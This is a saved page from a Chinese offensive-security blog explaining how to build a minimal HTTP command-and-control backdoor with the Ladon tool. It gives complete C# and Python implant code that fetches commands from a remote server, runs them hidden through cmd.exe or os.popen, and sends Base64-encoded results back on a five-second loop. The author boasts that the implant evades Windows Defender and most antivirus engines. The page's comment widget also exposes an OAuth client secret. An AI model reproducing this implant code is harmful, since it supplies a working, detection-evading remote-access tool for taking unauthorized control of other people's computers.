@@ -1,0 +1,406 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Rat">
+
+
+<meta name="description" content="前言
+写了几篇无回显命令执行漏洞Ladon回显方法，接下来我们它升级，既然我们可以通过漏洞执行无回显命令都可以得到回显，那么我们自己写的程序不是更轻而易举吗？所谓远控不过就是通过各种协议传输攻击...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    利用Ladon实现C2免杀所有杀软 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="利用Ladon实现C2免杀所有杀软">
+            
+            利用Ladon实现C2免杀所有杀软
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/Rat/">Rat</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Rat/" rel="tag">Rat</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/05/24</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1425</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="前言">前言</h3>
+<p>写了几篇无回显命令执行漏洞Ladon回显方法，接下来我们它升级，既然我们可以通过漏洞执行无回显命令都可以得到回显，那么我们自己写的程序不是更轻而易举吗？所谓远控不过就是通过各种协议传输攻击者的操作指令与结果而已。早期都是用TCP协议实现，之后FTP、HTTP（什么网盘、邮箱、博客等都是并非什么新方式只是换个网址或API而已），大家常用的CS也是HTTP协议，本文用Ladon来实现个简单的C2。</p>
+<h3 id="启动WEB">启动WEB</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="参数">参数</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ip.txt or ip.jpg        Get Target WanIP</span><br><span class="line">/getstr/AnyString        Get Request String</span><br><span class="line">/getb64/AnyString        Base64 Encode (Request String)</span><br><span class="line">/deb64/Base64String      Base64 Decode (Request String)</span><br><span class="line">/deb64txt/Base64String      Base64 Decode Save TXT</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="浏览器回显">浏览器回显</h3>
+<p>由于是HTTP协议，可以通过浏览器访问得到Ladon回显BASE64解密结果，就是说我们只要通过命令行发送HTTP请求即可在Ladon控制台看到命令执行后的结果。getstr为发送明文，但是结果中有特殊字符或换行就无法HTTP请求了，所以我们使用BASE64加密，这个原理我们在JAVA反序列化漏洞回显中有提到过。</p>
+<h4 id="明文回显">明文回显</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.43:800/getstr/cve2020">http://192.168.1.43:800/getstr/cve2020</a></p>
+<h4 id="Base64回显">Base64回显</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64/MTIzMTIzMTIzMTIzMTI=</a></p>
+<h4 id="保存txt">保存txt</h4>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=</a><br>
+<a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=</a></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
+<h3 id="HTTP-C2原理">HTTP C2原理</h3>
+<p>1.搭建WEB,可Apache、IIS、Tomcat或者自己研发如Ladon、CobaltStrike<br>
+2.通过HTTP协议获取指令、回传结果<br>
+3.指令执行功能(CMD执行、文件上传下载、其它功能等)</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line">{</span><br><span class="line">	//首先在VPS上执行命令: Ladon web 800 一键启动服务器</span><br><span class="line">	//其次在Ladon根目录下放cmd.txt，里面存放要执行的命令</span><br><span class="line"></span><br><span class="line">	//第一步 获取命令</span><br><span class="line">	string url = <span class="string">"http://192.168.250.27:800/cmd.txt"</span>;</span><br><span class="line">	string cmd = httpget(url);</span><br><span class="line"></span><br><span class="line">	//第二步 执行命令</span><br><span class="line">	string result = execcmd(cmd);</span><br><span class="line"></span><br><span class="line">	//第三步 发送结果</span><br><span class="line">	//httpget(<span class="string">"http://192.168.250.27:800/getstr/"</span>+result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//第三步 发送结果 Base64加密支持多行结果</span><br><span class="line">	httpget(<span class="string">"http://192.168.250.27:800/deb64/"</span> + Base64_encodeUTF8(result));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">catch (Exception s)</span><br><span class="line">{</span><br><span class="line">	Console.WriteLine(<span class="string">"Error: "</span> + s.Message);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: 定时执行如设定5秒，就和CS原理一样了</p>
+<h3 id="HTTP下达指令、接收结果代码">HTTP下达指令、接收结果代码</h3>
+<p>既然是通过HTTP实现的，那么我们当然是通过HTTP下达指令，我们可以把指令放在cmd.txt中，然后通过HTTP读取TXT内容，这不就是相当于下达指令了吗？读取到CMD后，执行CMD再将结果通过HTTP回传，所以我们可以使用同一个方法，只是下达指令和接收结果是不同URL而已。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private static string httpget(String url)</span><br><span class="line">{</span><br><span class="line">	HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">	request.Method = <span class="string">"GET"</span>;</span><br><span class="line">	request.Accept = <span class="string">"*/*"</span>;</span><br><span class="line">	HttpWebResponse response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	Stream getStream = response.GetResponseStream();</span><br><span class="line">	StreamReader streamreader = new StreamReader(getStream);</span><br><span class="line">	string result = streamreader.ReadToEnd();</span><br><span class="line">	Console.WriteLine(result);</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>执行CMD通过getstr接收明文结果<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/Ladon_rat.PNG"></p>
+<h3 id="执行CMD代码">执行CMD代码</h3>
+<p>接收到的CMD，通过此代码执行命令并获取结果。列目录、文件下载等其它功能同理</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private static string execcmd(string cmd)</span><br><span class="line">{</span><br><span class="line">	Process CmdProcess = new Process();</span><br><span class="line">	CmdProcess.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">	CmdProcess.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.Arguments = <span class="string">"/c "</span> + cmd;</span><br><span class="line">	CmdProcess.Start();</span><br><span class="line">	string result = CmdProcess.StandardOutput.ReadToEnd();</span><br><span class="line">	CmdProcess.WaitForExit();</span><br><span class="line">	CmdProcess.Close();</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Base64加密代码">Base64加密代码</h3>
+<p>由于明文传输不支持多行结果，将会导致很多命令无法通过GET方式取回显，所以我们可通过BASE64回传，既不直接暴露CMD结果，也解决了多行结果无法回显问题。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static string Base64_encodeUTF8(string str)</span><br><span class="line">{</span><br><span class="line">	<span class="built_in">return</span> Convert.ToBase64String(Encoding.UTF8.GetBytes(str));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>BASE64加密的结果传到Ladon后会自动解密，用IIS、Apache等无此功能(省去脚本编写)<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/Ladon_rat2.PNG"></p>
+<h3 id="win10-Defender免杀">win10 Defender免杀</h3>
+<p>测试win10最新版defender轻松免杀<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/win10_av.gif"></p>
+<h3 id="免杀virscan所有杀软">免杀virscan所有杀软</h3>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/bypass_allav.PNG"></p>
+<p><a target="_blank" rel="noopener" href="https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9">https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9</a></p>
+<p>显然很多杀软很垃圾的，对于自己写的RAT依旧轻松免杀,所以那些说自己写的没几个人用的非公开马只针对几个杀软认为自己牛B的，其实免杀水平都不怎样。当你写个公开的工具且很多人使用，依旧能免杀才叫牛，不是写一个没几个人用的东西免杀几个月还认为免杀牛逼，忽悠不会写马的菜B认为免杀难的差不多。你免杀别人公开的大量人用的东西当然难，不公开的东西可能并不需要怎么修改都免杀，功能越少越容易做，难个蛋蛋。</p>
+<h3 id="以色列杀软牛B">以色列杀软牛B</h3>
+<p>突然想起还有一个杀软网站，测试后发现被以色列杀软杀了，这种出现HTTP请求和CMD执行的，那些不杀的杀软，至少也要报个可疑才对。居然不报，还是以色列牛逼<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/cbereason_kill.PNG"><br>
+<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection">https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection</a></p>
+<h3 id="Python实现C2">Python实现C2</h3>
+<p>使用PY实现就更简单了，我们可直接套用之前CS假上线的代码，稍微修改加上命令执行即可，参考: <a href="http://k8gege.org/p/40523.html">http://k8gege.org/p/40523.html</a></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import urllib2</span><br><span class="line">import <span class="keyword">time</span></span><br><span class="line">import os</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line"><span class="comment">### Cobalt Strike Cheat by K8gege</span></span><br><span class="line"><span class="comment">### http://k8gege.org/p/40523.html</span></span><br><span class="line">def cscheat():</span><br><span class="line">	opener = urllib2.build_opener()</span><br><span class="line">	res = opener.open(<span class="string">"http://192.168.250.27:800/cmd.txt"</span>)</span><br><span class="line">	cmd = res.read()</span><br><span class="line">	<span class="built_in">print</span> cmd</span><br><span class="line">	result = os.popen(cmd)  </span><br><span class="line">	res = result.read() </span><br><span class="line">	cmdResult=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> res.splitlines():  </span><br><span class="line">		cmdResult+=line+<span class="string">"\r\n"</span></span><br><span class="line">	<span class="built_in">print</span> cmdResult</span><br><span class="line">	<span class="comment">#opener.open("http://192.168.250.27:800/getstr/"+cmdResult)</span></span><br><span class="line">	opener.open(<span class="string">"http://192.168.250.27:800/deb64/"</span>+base64.b64encode(cmdResult))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:    </span><br><span class="line">	<span class="built_in">print</span>(time.strftime(<span class="string">'%Y-%m-%d %X'</span>,time.localtime()))    </span><br><span class="line">	cscheat()</span><br><span class="line">	time.sleep(5)</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Download">Download</h3>
+<p>本文完整代码LadonRat.rar，在K8小密圈可下载</p>
+<h4 id="LadonGo-ALL-OS">LadonGo (ALL OS)</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo/releases">https://github.com/k8gege/LadonGo/releases</a></p>
+<h4 id="Ladon-Windows-Cobalt-Strike">Ladon (Windows &amp; Cobalt Strike)</h4>
+<p>历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+8.3版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/nbtinfo.html" class="pre-post btn btn-default" title="〖工具〗Ladon 8.4 &amp; Cobalt Strike插件发布">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon 8.4 &amp; Cobalt Strike插件发布</span>
+    </a>
+    
+    
+    <a href="/p/Ladon_linux_echo.html" class="next-post btn btn-default" title="无回显命令执行漏洞之Linux渗透">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            无回显命令执行漏洞之Linux渗透</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8WEB"><span class="toc-text">启动WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-text">参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9B%9E%E6%98%BE"><span class="toc-text">浏览器回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E5%9B%9E%E6%98%BE"><span class="toc-text">明文回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Base64%E5%9B%9E%E6%98%BE"><span class="toc-text">Base64回显</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98txt"><span class="toc-text">保存txt</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-C2%E5%8E%9F%E7%90%86"><span class="toc-text">HTTP C2原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E4%B8%8B%E8%BE%BE%E6%8C%87%E4%BB%A4%E3%80%81%E6%8E%A5%E6%94%B6%E7%BB%93%E6%9E%9C%E4%BB%A3%E7%A0%81"><span class="toc-text">HTTP下达指令、接收结果代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CCMD%E4%BB%A3%E7%A0%81"><span class="toc-text">执行CMD代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64%E5%8A%A0%E5%AF%86%E4%BB%A3%E7%A0%81"><span class="toc-text">Base64加密代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win10-Defender%E5%85%8D%E6%9D%80"><span class="toc-text">win10 Defender免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80virscan%E6%89%80%E6%9C%89%E6%9D%80%E8%BD%AF"><span class="toc-text">免杀virscan所有杀软</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E8%89%B2%E5%88%97%E6%9D%80%E8%BD%AF%E7%89%9BB"><span class="toc-text">以色列杀软牛B</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%AE%9E%E7%8E%B0C2"><span class="toc-text">Python实现C2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Download"><span class="toc-text">Download</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LadonGo-ALL-OS"><span class="toc-text">LadonGo (ALL OS)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-Windows-Cobalt-Strike"><span class="toc-text">Ladon (Windows &amp; Cobalt Strike)</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
